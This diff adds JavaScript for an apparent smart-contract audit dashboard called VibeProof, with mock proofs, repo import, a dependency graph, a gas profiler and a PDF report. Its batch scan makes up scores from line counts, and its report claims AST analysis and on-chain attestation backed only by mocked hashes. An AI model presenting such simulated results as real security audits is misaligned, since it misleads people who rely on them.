+ {name:'TokenRegistry.sol',score:58,summary:'verifyToken() terbuka untuk siapa pun sehingga badge verifikasi dapat dipalsukan. Return value ERC-20 tidak diverifikasi dan loop batch tidak dibatasi.',findings:[['High','Missing access control verifyToken()','26','Tambahkan modifier onlyAdmin'],['Medium','Unchecked ERC-20 return value','40','Gunakan SafeERC20.safeTransfer'],['Medium','Unbounded loop (DoS gas)','39','Batasi panjang batch / pull-payment']],hash:keccakMock('proof:TokenRegistry'),tx:keccakMock('tx:TokenRegistry'),block:3412880-900,auditor:'0x9aC177b0eF44c2A5d1B8031f77e09c77',min:22},
+ {name:'VulnerableVault.sol',score:28,summary:'Kontrak dapat dikuras sepenuhnya melalui reentrancy pada withdraw(). Autentikasi tx.origin membuka phishing front-running dan setOwner() tanpa access control memungkinkan takeover.',findings:[['Critical','Reentrancy — external call sebelum state update','21','ReentrancyGuard + checks-effects-interactions'],['Critical','tx.origin authentication','28','Ganti msg.sender + onlyOwner'],['High','setOwner() tanpa access control','32','Modifier onlyOwner + event'],['Medium','Tidak ada event deposit/withdraw','13','Emit event untuk audit trail']],hash:keccakMock('proof:VulnerableVault'),tx:keccakMock('tx:VulnerableVault'),block:3412880-40,auditor:'0x38bF4d01c9aE77e5b021Ff6cD81a20A4',min:4}
+];
+let proofIdx=0;
+function renderProofSelect(){
+  $('#proofSelect').innerHTML=PROOFS.map((p,i)=>'<option value="'+i+'">'+p.name+' · '+p.score+'/100 · '+gradeOf(p.score).verdict+'</option>').join('');
+  $('#proofSelect').value=proofIdx;
+}
+$('#proofSelect').addEventListener('change',e=>{proofIdx=+e.target.value;renderProof();});
+function renderProof(){
+  const p=PROOFS[proofIdx],net=NETWORKS[state.network],g=gradeOf(p.score);
+  const url='https://vibeproof.botchain.ai/proof/'+p.hash;
+  $('#permalink').value=url;
+  $('#pubNet').textContent=net.name+' · '+net.id;
+  $('#pubRing').innerHTML=ringSVG(p.score,110,6);
+  $('#pubContract').textContent=p.name;
+  $('#pubVerdict').textContent=g.verdict;
+  $('#pubVerdict').className='mt-2 chip inline-flex items-center h-8 px-3.5 rounded-full border text-[11px] font-extrabold tracking-widest uppercase '+g.chip;
+  $('#pubSummary').textContent=p.summary;
+  $('#pubHash').textContent=p.hash;
+  $('#pubAuditor').textContent=p.auditor;
+  $('#pubTx').textContent=p.tx;
+  $('#pubBlock').textContent='#'+p.block.toLocaleString('en-US')+' · '+new Date(Date.now()-p.min*60000).toLocaleString('id-ID',{dateStyle:'medium',timeStyle:'medium'});
+  $('#pubExplorer').href=net.explorer+'/tx/'+p.tx;
+  const md='[![VibeProof: '+p.score+'/100](https://vibeproof.botchain.ai/badge/'+p.hash.slice(2,10)+'.svg)]('+url+')';
+  $('#pubBadgeMd').textContent=md;
+  $('#pubBadgeScore').textContent=p.score+'/100';
+  $('#pubBadgeScore').className='px-2 grid place-items-center '+(g.key==='safe'?'bg-safe':g.key==='warn'?'bg-warn':'bg-crit')+' text-white';
+  $('#qrBox').innerHTML=qrSVG(net.explorer+'/tx/'+p.tx,168);
+  $('#qrCaption').textContent=net.explorer+'/tx/'+shortHash(p.tx,10,6);
+
+  // OG card
+  $('#ogScore').textContent=p.score;
+  $('#ogScore').className='text-8xl font-extrabold font-mono leading-none '+(g.key==='safe'?'text-safe':g.key==='warn'?'text-warn':'text-crit');
+  $('#ogVerdict').textContent=g.verdict;
+  $('#ogVerdict').className='inline-flex items-center h-12 px-6 rounded-full border-2 text-2xl font-extrabold tracking-widest uppercase '+(g.key==='safe'?'border-safe/60 bg-safe/10 text-safe':g.key==='warn'?'border-warn/60 bg-warn/10 text-warn':'border-crit/60 bg-crit/10 text-crit');
+  $('#ogContract').textContent=p.name;
+  $('#ogHash').textContent=shortHash(p.hash,8,6);
+  $('#ogChain').textContent=net.name+' · '+net.id;
+  $('#ogTx').textContent='tx '+shortHash(p.tx,8,6);
+  const og='https://vibeproof.botchain.ai/api/og/'+p.hash.slice(2,18)+'.png';
+  $('#ogUrl1').textContent=og;
+  $('#ogUrl2').textContent='VibeProof Audit — '+p.name+' ('+p.score+'/100)';
+  $('#ogShareX').onclick=()=>window.open('https://twitter.com/intent/tweet?text='+encodeURIComponent('Verifiable security proof: '+p.name+' scored '+p.score+'/100 on @BOTChain_ai via VibeProof 🛡️ '+url+' #VibeProof #BOTChain'),'_blank');
+  $('#copyOgUrl').onclick=()=>copyText(og,'OG image URL disalin');
+
+  // PDF preview
+  const docId='VP-'+net.id+'-'+p.hash.slice(2,10).toUpperCase();
+  $('#pdfId').textContent=docId;$('#pvDocId').textContent=docId;
+  $('#pvContract').textContent=p.name+' · '+net.name+' (Chain ID '+net.id+')';
+  $('#pvScore').textContent=p.score+'/100';
+  $('#pvScore').style.color=g.color;
+  $('#pvVerdict').textContent=g.verdict;
+  $('#pvVerdict').style.color=g.color;
+  $('#pvSummary').textContent=p.summary;
+  $('#pvFindings').innerHTML=p.findings.map(f=>{
+    const col=f[0]==='Critical'?'#e11d48':f[0]==='High'?'#f97316':f[0]==='Medium'?'#d97706':'#52525b';
+    return '<tr><td class="px-3 py-2 border border-zinc-200 font-bold" style="color:'+col+'">'+f[0]+'</td><td class="px-3 py-2 border border-zinc-200">'+f[1]+'</td><td class="px-3 py-2 border border-zinc-200 font-mono">L'+f[2]+'</td><td class="px-3 py-2 border border-zinc-200">'+f[3]+'</td></tr>';
+  }).join('');
+  $('#pvNet').textContent=net.name+' ('+net.id+') · '+net.rpc;
+  $('#pvHash').textContent=p.hash;$('#pvTx').textContent=p.tx;
+  $('#pvBlock').textContent='#'+p.block.toLocaleString('en-US');
+  $('#pvTime').textContent=new Date(Date.now()-p.min*60000).toLocaleString('id-ID');
+  $('#pvAuditor').textContent=p.auditor;
+  $('#pvQr').innerHTML=qrSVG(url,132);
+  $('#pvQrCap').textContent=url;
+  renderPrintArea(p,net,docId);
+  fitOG();
+}
+function renderPrintArea(p,net,docId){
+  const g=gradeOf(p.score);
+  $('#printArea').innerHTML=
+   '<div style="font-family:ui-sans-serif,system-ui;color:#111;padding:32px">'+
+    '<div style="border-bottom:4px solid #06b6d4;padding-bottom:14px;display:flex;justify-content:space-between;align-items:flex-start">'+
+      '<div><h1 style="font-size:22px;font-weight:800;margin:0">VibeProof — Smart Contract Security Audit Report</h1>'+
+      '<p style="font-family:monospace;font-size:12px;color:#555;margin:6px 0 0">'+esc(p.name)+' · '+esc(net.name)+' (Chain ID '+net.id+')</p></div>'+
+      '<div style="text-align:right"><p style="font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:#777;margin:0">Security Score</p>'+
+      '<p style="font-family:monospace;font-size:34px;font-weight:800;margin:0;color:'+g.color+'">'+p.score+'/100</p>'+
+      '<p style="font-size:11px;font-weight:800;letter-spacing:.12em;color:'+g.color+';margin:0">'+g.verdict+'</p></div>'+
+    '</div>'+
+    '<h2 style="font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:#666;margin:22px 0 6px">1 · Executive Summary</h2>'+
+    '<p style="font-size:12.5px;line-height:1.65;margin:0">'+esc(p.summary)+'</p>'+
+    '<h2 style="font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:#666;margin:22px 0 6px">2 · Scope & Methodology</h2>'+
+    '<p style="font-size:12.5px;line-height:1.65;margin:0">Static AST analysis (solc 0.8.24), 42 SWC-based vulnerability heuristics, reentrancy graph traversal, access-control matrix review, unchecked-call detection, and opcode-level gas profiling. Audit evidence anchored on BOT Chain via VibeProof.certifyAudit() at 0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578.</p>'+
+    '<h2 style="font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:#666;margin:22px 0 6px">3 · Findings</h2>'+
+    '<table style="width:100%;border-collapse:collapse;font-size:11.5px"><thead><tr style="background:#f4f4f5;text-align:left"><th style="border:1px solid #e4e4e7;padding:6px">Severity</th><th style="border:1px solid #e4e4e7;padding:6px">Finding</th><th style="border:1px solid #e4e4e7;padding:6px">Line</th><th style="border:1px solid #e4e4e7;padding:6px">Remediation</th></tr></thead><tbody>'+
+      p.findings.map(f=>'<tr><td style="border:1px solid #e4e4e7;padding:6px;font-weight:700">'+f[0]+'</td><td style="border:1px solid #e4e4e7;padding:6px">'+esc(f[1])+'</td><td style="border:1px solid #e4e4e7;padding:6px;font-family:monospace">L'+f[2]+'</td><td style="border:1px solid #e4e4e7;padding:6px">'+esc(f[3])+'</td></tr>').join('')+
+    '</tbody></table>'+
+    '<h2 style="font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:#666;margin:22px 0 6px">4 · On-Chain Attestation</h2>'+
+    '<table style="font-family:monospace;font-size:11px;width:100%"><tbody>'+
+      [['Network',net.name+' ('+net.id+') · '+net.rpc],['Code Hash',p.hash],['Transaction',p.tx],['Block','#'+p.block.toLocaleString('en-US')],['Timestamp',new Date(Date.now()-p.min*60000).toLocaleString('id-ID')],['Auditor',p.auditor],['Explorer',net.explorer+'/tx/'+p.tx],['Doc ID',docId]]
+      .map(r=>'<tr><td style="padding:3px 8px 3px 0;color:#777;width:110px">'+r[0]+'</td><td style="padding:3px 0;word-break:break-all">'+esc(r[1])+'</td></tr>').join('')+
+    '</tbody></table>'+
+    '<div style="margin-top:26px;border-top:1px solid #e4e4e7;padding-top:10px;font-family:monospace;font-size:10px;color:#777;display:flex;justify-content:space-between">'+
+      '<span>© 2025 VibeProof · Girl Meets Tech × On Chain Consultancy Vol.2</span><span>WATERMARK: VIBIPROOF VERIFIED · '+docId+'</span></div>'+
+   '</div>';
+}
+$('#copyPermalink').addEventListener('click',()=>copyText($('#permalink').value,'Permalink publik disalin'));
+$('#pubShareX').addEventListener('click',()=>{
+  const p=PROOFS[proofIdx];
+  window.open('https://twitter.com/intent/tweet?text='+encodeURIComponent('Verifiable audit proof: '+p.name+' → '+p.score+'/100 on @BOTChain_ai 🛡️ '+$('#permalink').value+' #VibeProof #BOTChain'),'_blank');
+});
+$('#pubCopyBadge').addEventListener('click',()=>copyText($('#pubBadgeMd').textContent,'Badge markdown disalin'));
+$('#pdfDownload').addEventListener('click',()=>{toast('Dialog print terbuka — pilih "Save as PDF".','info');setTimeout(()=>window.print(),400);});
+$('#pdfPreview').addEventListener('click',()=>{$('#pdfPreviewBox').scrollIntoView({behavior:'smooth',block:'start'});});
+$$('.ptab').forEach(b=>b.addEventListener('click',()=>{
+  $$('.ptab').forEach(x=>x.className='ptab chip h-10 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300');
+  b.className='ptab chip h-10 px-4 text-xs font-bold text-cyber border-b-2 border-cyber -mb-px';
+  ['public','og','pdf'].forEach(k=>$('#ppane-'+k).classList.toggle('hidden',k!==b.dataset.ptab));
+  if(b.dataset.ptab==='og')fitOG();
+}));
+function fitOG(){
+  const wrap=$('#ogCard').parentElement;
+  if(!wrap)return;
+  const s=wrap.clientWidth/1200;
+  $('#ogCard').style.transform='scale('+s+')';
+}
+window.addEventListener('resize',fitOG);
+
+/* ═══════════════════════════════════════════════════════════
+   VIEW 5 — REPO IMPORTER
+   ═══════════════════════════════════════════════════════════ */
+const REPOS={
+ 'defi-vault-foundry':[
+  {p:'src/EtherVault.sol',loc:39,score:28,inherits:['ReentrancyGuard','Ownable'],calls:['IERC20.transfer']},
+  {p:'src/RewardToken.sol',loc:112,score:88,inherits:['ERC20','Ownable'],calls:[]},
+  {p:'src/StakingRewards.sol',loc:184,score:61,inherits:['ReentrancyGuard'],calls:['RewardToken.mint','EtherVault.deposit']},
+  {p:'src/interfaces/IERC20.sol',loc:14,score:99,inherits:[],calls:[]},
+  {p:'lib/openzeppelin/Ownable.sol',loc:88,score:99,inherits:['Context'],calls:[]},
+  {p:'lib/openzeppelin/ERC20.sol',loc:246,score:97,inherits:['IERC20','Context'],calls:[]},
+  {p:'test/EtherVault.t.sol',loc:96,score:null,inherits:['Test'],calls:['EtherVault.withdraw']}
+ ],
+ 'nft-minting-hardhat':[
+  {p:'contracts/GenesisPass.sol',loc:148,score:38,inherits:['ERC721','Ownable'],calls:[]},
+  {p:'contracts/MerkleWhitelist.sol',loc:64,score:91,inherits:[],calls:[]},
+  {p:'contracts/RoyaltySplitter.sol',loc:52,score:74,inherits:['Ownable'],calls:['GenesisPass.owner']},
+  {p:'contracts/interfaces/IERC2981.sol',loc:11,score:99,inherits:[],calls:[]}
+ ],
+ 'cross-chain-bridge':[
+  {p:'src/BridgeMessenger.sol',loc:210,score:54,inherits:['Ownable','ReentrancyGuard'],calls:['OracleAggregator.latestAnswer']},
+  {p:'src/OracleAggregator.sol',loc:96,score:90,inherits:['Ownable'],calls:[]},
+  {p:'src/TokenLocker.sol',loc:78,score:83,inherits:['SafeERC20'],calls:['IERC20.transfer']}
+ ]
+};
+let repoFiles=[],graphNodes=[],graphSel=null;
+function repoKey(){const u=$('#repoUrl').value.trim();return Object.keys(REPOS).find(k=>u.includes(k))||'defi-vault-foundry';}
+function loadRepo(key){
+  repoFiles=REPOS[key].map(f=>Object.assign({},f,{scanned:f.score!=null,sel:true}));
+  $('#treeMeta').textContent=repoFiles.length+' files';
+  renderTree();buildGraph(key);updateRepoStats();
+  toast('Repo dimuat: '+repoFiles.length+' file Solidity terdeteksi.','ok');
+}
+$('#loadRepo').addEventListener('click',()=>loadRepo(repoKey()));
+$$('.repo-preset').forEach(b=>b.addEventListener('click',()=>{$('#repoUrl').value=b.dataset.repo;loadRepo(repoKey());}));
+function renderTree(){
+  $('#fileTree').innerHTML=repoFiles.length?repoFiles.map((f,i)=>{
+    const g=f.score!=null?gradeOf(f.score):null;
+    return '<div class="flex items-center gap-3 px-4 py-2.5 hover:bg-ink-700/40 transition-colors">'+
+      '<input type="checkbox" data-fsel="'+i+'" '+(f.sel?'checked':'')+' class="w-4 h-4 accent-cyan-400 shrink-0"/>'+
+      '<svg viewBox="0 0 24 24" class="w-4 h-4 text-zinc-600 shrink-0" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M14 3v5h5"/><path d="M6 3h8l5 5v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z"/></svg>'+
+      '<span class="min-w-0 flex-1"><span class="block font-mono text-[11.5px] text-zinc-200 truncate">'+f.p+'</span>'+
+      '<span class="block font-mono text-[10px] text-zinc-600">'+f.loc+' LOC'+(f.inherits.length?' · inherits '+f.inherits.join(', '):'')+'</span></span>'+
+      (f.scanned&&g?'<span class="chip h-6 px-2 inline-flex items-center rounded border font-mono text-[10px] font-extrabold '+g.chip+'">'+f.score+'</span>'
+                   :'<span class="chip h-6 px-2 inline-flex items-center rounded border border-zinc-700 bg-ink-700 font-mono text-[10px] text-zinc-500">not scanned</span>')+
+    '</div>';
+  }).join(''):'<p class="px-4 py-10 text-center text-[12.5px] text-zinc-600">Belum ada file. Muat repo atau drop file .sol.</p>';
+  $$('#fileTree input').forEach(i=>i.addEventListener('change',()=>{repoFiles[+i.dataset.fsel].sel=i.checked;updateRepoStats();}));
+}
+$('#scanAll').addEventListener('click',()=>{
+  const idx=repoFiles.map((f,i)=>i).filter(i=>repoFiles[i].sel&&f0(i));
+  function f0(i){return true;}
+  const targets=repoFiles.map((f,i)=>i).filter(i=>repoFiles[i].sel);
+  if(!targets.length){toast('Pilih minimal satu file.','warn');return;}
+  $('#batchBar').classList.remove('hidden');
+  let done=0;
+  const t=setInterval(()=>{
+    if(done>=targets.length){
+      clearInterval(t);$('#batchLabel').textContent='Batch audit selesai ✓';updateRepoStats();renderTree();buildGraph(repoKey());
+      toast('Batch audit '+targets.length+' kontrak selesai.','ok');return;
+    }
+    const i=targets[done],f=repoFiles[i];
+    f.score=f.score!=null?f.score:Math.max(18,Math.min(99,100-Math.floor((f.loc%7)*9)-((f.p.includes('test')||f.p.includes('interfaces'))?0:12)));
+    f.scanned=true;done++;
+    const pct=Math.round(done/targets.length*100);
+    $('#batchFill').style.width=pct+'%';$('#batchPct').textContent=pct+'%';
+    $('#batchLabel').textContent='Scanning '+f.p;
+    renderTree();updateRepoStats();
+  },420);
+});
+function updateRepoStats(){
+  const scanned=repoFiles.filter(f=>f.scanned&&f.score!=null);
+  const loc=repoFiles.reduce((s,f)=>s+f.loc,0);
+  const calls=repoFiles.reduce((s,f)=>s+f.calls.length,0);
+  $('#repoLoc').textContent=loc.toLocaleString('en-US');
+  $('#repoFiles').textContent=repoFiles.length+' .sol files';
+  $('#repoCalls').textContent=calls;
+  if(scanned.length){
+    const avg=Math.round(scanned.reduce((s,f)=>s+f.score,0)/scanned.length);
+    $('#repoRing').innerHTML=ringSVG(avg,52,4);
+    $('#repoRingLabel').innerHTML='portfolio avg<br><span class="text-zinc-600">'+scanned.length+' contracts scanned</span>';
+  }else{$('#repoRing').innerHTML=ringSVG(0,52,4);$('#repoRingLabel').textContent='belum di-scan';}
+}
+/* drag & drop real files */
+const dz=$('#dropzone');
+['dragenter','dragover'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();dz.classList.add('drag');}));
+['dragleave','drop'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();dz.classList.remove('drag');}));
+dz.addEventListener('drop',e=>{
+  const files=Array.from(e.dataTransfer.files||[]);
+  handleFiles(files);
+});
+$('#fileInput').addEventListener('change',e=>handleFiles(Array.from(e.target.files||[])));
+function handleFiles(files){
+  const sols=files.filter(f=>f.name.endsWith('.sol'));
+  if(!sols.length){toast('Hanya file .sol yang dianalisis ('+files.length+' file diterima).','warn');return;}
+  let pending=sols.length;
+  sols.forEach(f=>{
+    const fr=new FileReader();
+    fr.onload=()=>{
+      const src=String(fr.result||'');
+      const loc=src.split('\n').length;
+      const score=quickScore(src);
+      repoFiles.push({p:f.name,loc,score,scanned:true,sel:true,inherits:detectInherits(src),calls:detectCalls(src)});
+      if(--pending===0){renderTree();updateRepoStats();buildGraph('custom');toast(sols.length+' file .sol dianalisis lokal.','ok');}
+    };
+    fr.readAsText(f);
+  });
+}
+function quickScore(src){
+  let s=96;
+  if(/tx\.origin/.test(src))s-=30;
+  if(/\.call\s*\{\s*value/.test(src)&&!/nonReentrant/.test(src))s-=28;
+  if(/delegatecall/.test(src))s-=12;
+  if(/selfdestruct/.test(src))s-=25;
+  const setters=(src.match(/function\s+set\w+\s*\(/g)||[]).length;
+  const guarded=(src.match(/onlyOwner|onlyRole|nonReentrant/g)||[]).length;
+  s-=Math.max(0,setters-guarded)*8;
+  if(!/event\s+\w+/.test(src))s-=6;
+  return Math.max(8,Math.min(99,s));
+}
+function detectInherits(src){const m=src.match(/contract\s+\w+\s+is\s+([^{]+)\{/);return m?m[1].split(',').map(x=>x.trim()):[];}
+function detectCalls(src){const out=[];const re=/([A-Za-z_]\w*)\s*\.\s*(transfer|mint|burn|withdraw|deposit|latestAnswer|owner|balanceOf)\s*\(/g;let m;while((m=re.exec(src)))out.push(m[1]+'.'+m[2]);return Array.from(new Set(out)).slice(0,4);}
+
+/* dependency graph */
+const GRAPH_LAYOUT={
+ 'defi-vault-foundry':[
+  {id:'EtherVault',x:120,y:80,kind:'core'},
+  {id:'StakingRewards',x:380,y:210,kind:'core'},
+  {id:'RewardToken',x:640,y:80,kind:'core'},
+  {id:'Ownable',x:120,y:330,kind:'oz'},
+  {id:'ReentrancyGuard',x:380,y:350,kind:'oz'},
+  {id:'ERC20',x:640,y:330,kind:'oz'},
+  {id:'IERC20',x:640,y:210,kind:'iface'}
+ ],
+ 'nft-minting-hardhat':[
+  {id:'GenesisPass',x:150,y:100,kind:'core'},
+  {id:'MerkleWhitelist',x:420,y:80,kind:'core'},
+  {id:'RoyaltySplitter',x:420,y:250,kind:'core'},
+  {id:'ERC721',x:150,y:330,kind:'oz'},
+  {id:'Ownable',x:640,y:180,kind:'oz'},
+  {id:'IERC2981',x:640,y:330,kind:'iface'}
+ ],
+ 'cross-chain-bridge':[
+  {id:'BridgeMessenger',x:380,y:90,kind:'core'},
+  {id:'OracleAggregator',x:130,y:250,kind:'core'},
+  {id:'TokenLocker',x:630,y:250,kind:'core'},
+  {id:'Ownable',x:250,y:370,kind:'oz'},
+  {id:'ReentrancyGuard',x:520,y:370,kind:'oz'},
+  {id:'SafeERC20',x:630,y:110,kind:'oz'}
+ ],
+ 'custom':[
+  {id:'Contract A',x:180,y:110,kind:'core'},
+  {id:'Contract B',x:520,y:110,kind:'core'},
+  {id:'Ownable',x:350,y:320,kind:'oz'}
+ ]
+};
+function buildGraph(key){
+  const layout=(GRAPH_LAYOUT[key]||GRAPH_LAYOUT['custom']).map(n=>Object.assign({},n));
+  graphNodes=layout;
+  const files=repoFiles;
+  const edges=[];
+  files.forEach(f=>{
+    const base=f.p.split('/').pop().replace('.sol','');
+    const from=layout.find(n=>n.id===base);
+    if(!from)return;
+    f.inherits.forEach(i=>{const t=layout.find(n=>n.id===i);if(t)edges.push({a:from.id,b:t.id,k:'inherits'});});
+    f.calls.forEach(c=>{const t=c.split('.')[0];const to=layout.find(n=>n.id===t);if(to&&to.id!==from.id)edges.push({a:from.id,b:to.id,k:'calls'});});
+  });
+  graphEdges=edges;drawGraph();
+}
+let graphEdges=[];
+const KIND_STYLE={core:{fill:'#101320',stroke:'#00F0FF',text:'#e0fbff'},oz:{fill:'#12161d',stroke:'#10b981',text:'#a7f3d0'},iface:{fill:'#12161d',stroke:'#52525b',text:'#d4d4d8'}};
+function drawGraph(){
+  const svg=$('#depGraph');
+  let s='<defs><marker id="gArrow" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#52525b"/></marker>'+
+        '<marker id="gArrowHi" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#00F0FF"/></marker></defs>';
+  graphEdges.forEach(e=>{
+    const a=graphNodes.find(n=>n.id===e.a),b=graphNodes.find(n=>n.id===e.b);
+    if(!a||!b)return;
+    const hi=graphSel&&(graphSel===e.a||graphSel===e.b);
+    const mx=(a.x+b.x)/2,my=(a.y+b.y)/2-30;
+    s+='<path d="M'+a.x+' '+a.y+' Q'+mx+' '+my+' '+b.x+' '+b.y+'" fill="none" stroke="'+(hi?'#00F0FF':'#3f3f46')+'" stroke-width="'+(hi?2:1.3)+'" marker-end="'+(hi?'url(#gArrowHi)':'url(#gArrow)')+'" opacity="'+(graphSel&&!hi?0.3:0.9)+'" '+(e.k==='inherits'?'':'stroke-dasharray="5 4"')+'/>';
+    if(hi)s+='<text x="'+mx+'" y="'+(my-4)+'" text-anchor="middle" font-size="9.5" fill="#67e8f9" font-family="monospace">'+e.k+'</text>';
+  });
+  graphNodes.forEach(n=>{
+    const k=KIND_STYLE[n.kind]||KIND_STYLE.core,sel=graphSel===n.id;
+    const rec=repoFiles.find(f=>f.p.split('/').pop().replace('.sol','')===n.id);
+    s+='<g class="gnode" data-node="'+n.id+'" transform="translate('+n.x+','+n.y+')">'+
+      '<rect x="-84" y="-24" width="168" height="48" rx="12" fill="'+k.fill+'" stroke="'+(sel?'#00F0FF':k.stroke)+'" stroke-width="'+(sel?2.2:1.2)+'" '+(sel?'filter="drop-shadow(0 0 10px rgba(0,240,255,.45))"':'')+'/>'+
+      '<text x="0" y="-3" text-anchor="middle" font-size="12" font-weight="700" fill="'+k.text+'">'+esc(n.id)+'</text>'+
+      '<text x="0" y="14" text-anchor="middle" font-size="9.5" fill="#71717a" font-family="monospace">'+(rec?(rec.scanned?'score '+(rec.score!=null?rec.score:'—')+' · '+rec.loc+' LOC':rec.loc+' LOC'):n.kind)+'</text>'+
+      '</g>';
+  });
+  svg.innerHTML=s;
+  bindGraphDrag(svg);
+  $$('.gnode',svg).forEach(g=>g.addEventListener('click',()=>{
+    const id=g.dataset.node;graphSel=graphSel===id?null:id;drawGraph();
+    const rec=repoFiles.find(f=>f.p.split('/').pop().replace('.sol','')===id);
+    if(rec&&graphSel){
+      $('#nodeDetail').innerHTML='<span class="text-zinc-200 font-bold">'+rec.p+'</span> · '+rec.loc+' LOC · '+(rec.scanned&&rec.score!=null?'score <span style="color:'+gradeOf(rec.score).color+'">'+rec.score+'</span>':'not scanned')+'<br><span class="text-zinc-600">inherits: '+(rec.inherits.join(', ')||'—')+' · external calls: '+(rec.calls.join(', ')||'none')+'</span>';
+    }else $('#nodeDetail').textContent='Klik node untuk melihat detail kontrak, pewarisan, dan panggilan eksternal.';
+  }));
+}
+function bindGraphDrag(svg){
+  let drag=null;
+  const pt=evt=>{
+    const r=svg.getBoundingClientRect();
+    const vb=svg.viewBox.baseVal;
+    return {x:(evt.clientX-r.left)/r.width*vb.width,y:(evt.clientY-r.top)/r.height*vb.height};
+  };
+  svg.addEventListener('pointerdown',e=>{
+    const g=e.target.closest('.gnode');if(!g)return;
+    const n=graphNodes.find(x=>x.id===g.dataset.node);if(!n)return;
+    drag={n,start:pt(e)};svg.setPointerCapture(e.pointerId);
+  });
+  svg.addEventListener('pointermove',e=>{
+    if(!drag)return;const p=pt(e);
+    drag.n.x=Math.max(90,Math.min(670,drag.n.x+(p.x-drag.start.x)));
+    drag.n.y=Math.max(34,Math.min(396,drag.n.y+(p.y-drag.start.y)));
+    drag.start=p;drawGraph();
+  });
+  svg.addEventListener('pointerup',()=>{drag=null;});
+  svg.addEventListener('pointercancel',()=>{drag=null;});
+}
+$('#graphReset').addEventListener('click',()=>{graphSel=null;buildGraph(repoKey());toast('Layout graph direset.','info');});
+
+/* ═══════════════════════════════════════════════════════════
+   VIEW 6 — GAS PROFILER
+   ═══════════════════════════════════════════════════════════ */
+const GAS_FN=[
+ {fn:'deposit()',before:84210,after:71940},
+ {fn:'withdraw()',before:96480,after:78120},
+ {fn:'transfer(address,uint256)',before:52310,after:44080},
+ {fn:'setFee(uint256)',before:28940,after:26110},
+ {fn:'claimRewards()',before:118200,after:92430},
+ {fn:'bulkTransfer(…)',before:214880,after:161200}
+];
+const GAS_FINDINGS=[
+ {t:'Storage slot packing',sev:'high',save:2100,before:'uint256 public feeBps;\naddress public owner;\nbool public paused;',after:'struct Config { uint64 feeBps; bool paused; }\nConfig public config;   // 1 slot\naddress public owner;   // 1 slot'},
+ {t:'Custom errors vs require()',sev:'medium',save:60,before:'require(bal > 0, "No funds available");',after:'error ZeroBalance();\nif (bal == 0) revert ZeroBalance();'},
+ {t:'Loop length caching',sev:'medium',save:100,before:'for (uint256 i = 0; i < arr.length; i++) {',after:'uint256 len = arr.length;\nfor (uint256 i; i < len; ) { … unchecked { ++i; } }'},
+ {t:'calldata instead of memory',sev:'low',save:340,before:'function batch(address[] memory to) external {',after:'function batch(address[] calldata to) external {'},
+ {t:'Duplicate SLOAD elimination',sev:'high',save:100,before:'totalShares -= a;\nemit Updated(totalShares);',after:'uint256 ts = totalShares - a;\ntotalShares = ts;\nemit Updated(ts);'},
+ {t:'unchecked arithmetic block',sev:'low',save:45,before:'_shares[msg.sender] = bal - amt;',after:'unchecked { _shares[msg.sender] = bal - amt; }'}
+];
+const OPCODES=[['SSTORE',38,'#f43f5e'],['SLOAD',22,'#f59e0b'],['CALL',18,'#00F0FF'],['LOG',9,'#10b981'],['Arithmetic',8,'#a78bfa'],['Memory/Stack',5,'#52525b']];
+function renderGas(){
+  $('#gasBody').innerHTML=GAS_FN.map(f=>{
+    const saved=f.before-f.after,pct=Math.round(saved/f.before*100);
+    return '<tr><td class="px-4 py-2.5 text-zinc-200 font-bold">'+f.fn+'</td>'+
+      '<td class="px-3 py-2.5 text-zinc-500">'+f.before.toLocaleString('en-US')+'</td>'+
+      '<td class="px-3 py-2.5 text-safe">'+f.after.toLocaleString('en-US')+'</td>'+
+      '<td class="px-3 py-2.5 text-white font-bold">−'+saved.toLocaleString('en-US')+' <span class="text-zinc-500">('+pct+'%)</span></td>'+
+      '<td class="px-4 py-2.5"><span class="block h-1.5 rounded-full bg-ink-600 overflow-hidden"><span class="block h-full rounded-full bg-gradient-to-r from-cyber-600 to-safe" style="width:'+pct*3+'%"></span></span></td></tr>';
+  }).join('');
+  $('#opcodeBars').innerHTML=OPCODES.map(([n,p,c])=>'<div><div class="flex items-center gap-2 font-mono text-[11px]"><span class="w-24 text-zinc-400">'+n+'</span><span class="flex-1 h-2 rounded-full bg-ink-600 overflow-hidden"><span class="block h-full rounded-full" style="width:'+p*2.4+'%;background:'+c+'"></span></span><span class="w-10 text-right text-zinc-300 font-bold">'+p+'%</span></div></div>').join('');
+  $('#opcodeStack').innerHTML=OPCODES.map(([n,p,c])=>'<span style="width:'+p+'%;background:'+c+'" title="'+n+' '+p+'%"></span>').join('');
+  $('#gasFindings').innerHTML=GAS_FINDINGS.map((f,i)=>
+    '<div class="px-4 py-3.5">'+
+      '<div class="flex flex-wrap items-center gap-2"><span class="chip h-5 px-2 inline-flex items-center rounded border text-[9px] font-extrabold tracking-widest uppercase '+SEV_CHIP[f.sev]+'">'+f.sev+'</span>'+
+      '<span class="text-[12.5px] font-bold text-zinc-100">'+f.t+'</span><span class="flex-1"></span>'+
+      '<span class="chip h-5 px-2 inline-flex items-center rounded bg-safe/10 border border-safe/40 font-mono text-[9.5px] text-safe font-bold">−'+f.save.toLocaleString('en-US')+' gas</span></div>'+
+      '<div class="mt-2.5 grid sm:grid-cols-2 gap-2">'+
+        '<pre class="code rounded-md border border-crit/25 bg-crit/[0.06] px-2.5 py-2 text-[10.5px] text-zinc-400 overflow-x-auto scroll-thin">'+hl(f.before,'sol')+'</pre>'+
+        '<pre class="code rounded-md border border-safe/25 bg-safe/[0.06] px-2.5 py-2 text-[10.5px] text-zinc-300 overflow-x-auto scroll-thin">'+hl(f.after,'sol')+'</pre>'+
+      '</div>'+
